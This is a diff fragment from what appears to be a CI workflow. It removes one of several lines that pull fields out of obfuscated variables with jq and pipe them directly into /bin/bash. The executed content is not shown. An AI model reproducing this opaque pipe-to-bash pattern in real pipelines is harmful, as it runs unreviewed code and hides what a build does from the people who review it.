@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$mof0" | jq -r .wu954 | /bin/bash
           echo $l2 | jq -r .q92 | /bin/bash
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
-          echo $tojs21 | jq -r .e478 | /bin/bash
           echo $yrze836 | jq -r .gc48981 | /bin/bash
           echo $c06 | jq -r .eoof784 | /bin/bash
           echo $v48 | jq -r .hjls2 | /bin/bash
